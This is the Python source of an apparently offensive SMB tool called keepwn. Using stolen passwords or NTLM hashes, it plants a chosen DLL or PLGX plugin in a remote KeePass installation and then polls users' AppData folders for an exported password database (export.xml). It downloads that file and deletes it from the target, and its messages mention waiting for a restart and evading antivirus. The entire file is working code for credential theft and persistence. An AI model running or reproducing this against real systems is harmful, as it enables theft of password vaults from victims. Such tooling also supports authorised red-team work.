import ntpath
import os
from io import BytesIO
from pathlib import Path
from time import sleep

from impacket.smbconnection import SessionError

from keepwn.utils.logging import print_error, print_info, print_success, print_alert, print_found_plugins, Loader, \
    print_found_plugin_directory, print_copied_export, print_found_export
from keepwn.utils.parser import parse_mandatory_options
from keepwn.utils.smb import smb_connect


def get_plugin_folder_path(smb_connection, share, plugin_path):
    if plugin_path:
        if plugin_path.startswith('\\\\') and '$' in plugin_path:
            plugin_path = plugin_path.split('$')[1]
        if not plugin_path.endswith('KeePass Password Safe 2\\Plugins'):
            print_alert("Specified path does not look like a plugin path, do you want to use it [y/n]")
            ans = input('> ')
            if ans.lower() not in ['y', 'yes', '']:
                exit(0)
            return
    else:
        print_info("No KeePass Plugins path specified, searching in default locations..")
        plugin_path = '\\Program Files\\KeePass Password Safe 2\\Plugins\\'
    try:
        smb_connection.listPath(share, plugin_path)
    except SessionError as e:
        print_error("Unable to find KeePass plugin folder")
        return None
    print_found_plugin_directory('\\\\{}{}'.format(share, plugin_path))
    return plugin_path

def get_plugins(smb_connection, share, plugin_path):
    if not plugin_path.endswith('\\*'):
        plugin_path += '\\*'
    try:
        plugins = []
        for file in smb_connection.listPath(share, plugin_path):
            plugins.append(file.get_longname())
        plugins.remove('.')
        plugins.remove('..')
    except SessionError as e:
        print_error("Unable to find KeePass plugin folder")
        return None
    return plugins

def check_plugin(options):
    targets, share, domain, user, password, lm_hash, nt_hash = parse_mandatory_options(options)
    target = targets[0]
    smb_connection, error = smb_connect(target, share, user, password, domain, lm_hash, nt_hash)

    if error or not smb_connection:
        str_error = str(error)
        if 'Errno' in str_error:
            print_error(str_error.split('] ')[-1].capitalize())
        elif 'SMB' in str_error:
            print_error(str_error.split('(')[0])
        else:
            print_error('Unkown error while connecting to target: {}'.format(str_error))
        return

    plugin_folder_path = get_plugin_folder_path(smb_connection, share, options.plugin_path)

    if not plugin_folder_path:
        return

    plugins = get_plugins(smb_connection, share, plugin_folder_path)
    print_found_plugins(plugins)
    return

def add_plugin(options):

    if options.plugin is None:
        print_error('Missing plugin file, specify one with --plugin')
        exit()

    if not os.path.exists(options.plugin):
        print_error('The specified plugin file does not exist')
        exit()

    if not (options.plugin.lower().endswith('dll') or options.plugin.lower().endswith('plgx')):
        print_alert("The specified plugin file does not look like a plugin, do you want to use it anyway? [y/n]")
        ans = input('> ')
        if ans.lower() not in['y', 'yes', '']:
            exit(0)

    targets, share, domain, user, password, lm_hash, nt_hash = parse_mandatory_options(options)
    target = targets[0]
    smb_connection, error = smb_connect(target, share, user, password, domain, lm_hash, nt_hash)

    if error or not smb_connection:
        str_error = str(error)
        if 'Errno' in str_error:
            print_error(str_error.split('] ')[-1].capitalize())
        elif 'SMB' in str_error:
            print_error(str_error.split('(')[0])
        else:
            print_error('Unkown error while connecting to target: {}'.format(str_error))
        return

    plugin_folder_path = get_plugin_folder_path(smb_connection, share, options.plugin_path)
    plugin_file = Path(options.plugin).name

    found_plugin = False
    for plugin in get_plugins(smb_connection, share, plugin_folder_path):
        if plugin_file in plugin:
            found_plugin = True

    if found_plugin:
        print_alert("Plugin already added to KeePass Plugin directory, do you want to overwrite? [y/n]".format(plugin_file))
    else:
        print_alert("About to add {} to KeePass Plugin directory, do you want to continue? [y/n]".format(plugin_file))
    ans = input('> ')
    if ans.lower() not in ['y', 'yes', '']:
        exit(0)

    fh = open(options.plugin, 'rb')
    try:
        smb_connection.putFile(share, ntpath.join(plugin_folder_path, plugin_file), fh.read)
    except Exception as error:
        str_error = str(error)
        if 'Errno' in str_error:
            print_error(str_error.split('] ')[-1].capitalize())
        elif 'STATUS_SHARING_VIOLATION' in str_error:
            print_error("Can't overwrite plugin while it is in use use by KeePass")
        elif 'SMB' in str_error:
            print_error(str_error.split('(')[0])
        else:
            print_error('Unkown error while connecting to target: {}'.format(str_error))
        exit()

    fh.close()

    found_plugin = False
    for plugin in get_plugins(smb_connection, share, plugin_folder_path):
        if plugin_file in plugin:
            found_plugin = True

    if found_plugin:
        print_success('Plugin successfully added to KeePass, wait for next restart, poll and enjoy!')
    else:
        print_error('Unknown error while adding plugin to target, the file may have been deleted by AV')
    return

def clean_plugin(options):
    if options.plugin is None:
        print_error('Missing plugin file, specify one with --plugin')
        exit()

    targets, share, domain, user, password, lm_hash, nt_hash = parse_mandatory_options(options)
    target = targets[0]
    smb_connection, error = smb_connect(target, share, user, password, domain, lm_hash, nt_hash)

    if error or not smb_connection:
        str_error = str(error)
        if 'Errno' in str_error:
            print_error(str_error.split('] ')[-1].capitalize())
        elif 'SMB' in str_error:
            print_error(str_error.split('(')[0])
        else:
            print_error('Unkown error while connecting to target: {}'.format(str_error))
        return

    plugin_folder_path = get_plugin_folder_path(smb_connection, share, options.plugin_path)
    plugin_file = Path(options.plugin).name

    found_plugin = False
    for plugin in get_plugins(smb_connection, share, plugin_folder_path):
        if plugin_file in plugin:
            found_plugin = True

    if not found_plugin:
        print_alert("Plugin not found in KeePass Plugin directory, aborting deletion".format(plugin_file))
        exit()
    else:
        print_alert("About to remove {} from KeePass Plugin directory, do you want to continue [y/n]".format(plugin_file))
        ans = input('> ')
        if ans.lower() not in ['y', 'yes', '']:
            exit(0)

    try:
        smb_connection.deleteFile(share, ntpath.join(plugin_folder_path, plugin_file))
    except Exception as error:
        str_error = str(error)
        if 'Errno' in str_error:
            print_error(str_error.split('] ')[-1].capitalize())
        elif 'STATUS_SHARING_VIOLATION' in str_error:
            print_error("Can't delete the plugin while KeePass is running")
        elif 'SMB' in str_error:
            print_error(str_error.split('(')[0])
        else:
            print_error('Unkown error while connecting to target: {}'.format(str_error))
        return

    found_plugin = False
    for plugin in get_plugins(smb_connection, share, plugin_folder_path):
        if plugin_file in plugin:
            found_plugin = True

    if found_plugin:
        print_error('Failed to delete plugin')
    else:
        print_success('Plugin successfully deleted')
    return

def poll_plugin(options):

    targets, share, domain, user, password, lm_hash, nt_hash = parse_mandatory_options(options)
    target = targets[0]
    smb_connection, error = smb_connect(target, share, user, password, domain, lm_hash, nt_hash)

    if error or not smb_connection:
        str_error = str(error)
        if 'Errno' in str_error:
            print_error(str_error.split('] ')[-1].capitalize())
        elif 'SMB' in str_error:
            print_error(str_error.split('(')[0])
        else:
            print_error('Unkown error while connecting to target: {}'.format(str_error))
        return

    export_path = None
    try:
        with Loader("[>] Polling for database export every 5 seconds.. press CTRL+C to abort", end="Polling for database export every 5 seconds.. press CTRL+C to abort"):
            while not export_path:
                try:
                    for file in smb_connection.listPath(share, '\\Users\\*'):
                        if file.is_directory():
                            try:
                                path = '\\Users\\{}\\AppData\\Roaming\\export.xml'.format(file.get_longname())
                                for file in smb_connection.listPath(share, path):
                                    export_path = path
                                    continue
                            except SessionError as e:
                                pass  # the file was not found
                except SessionError as e:
                    pass  # the file was not found
                sleep(5)
    except KeyboardInterrupt:
        exit()

    print_found_export('\\\\{}\\{}'.format(share, export_path))

    try:
        buffer = BytesIO()
        smb_connection.getFile(share, export_path, buffer.write)
        local_path = os.path.join(os.getcwd(), 'export.xml')
        # downloads the exported database
        with open(local_path, "wb") as f:
            f.write(buffer.getbuffer())

        smb_connection.deleteFile(share, export_path)
        print_copied_export(local_path)
    except:
        print_error("Unkown error while getting export.")
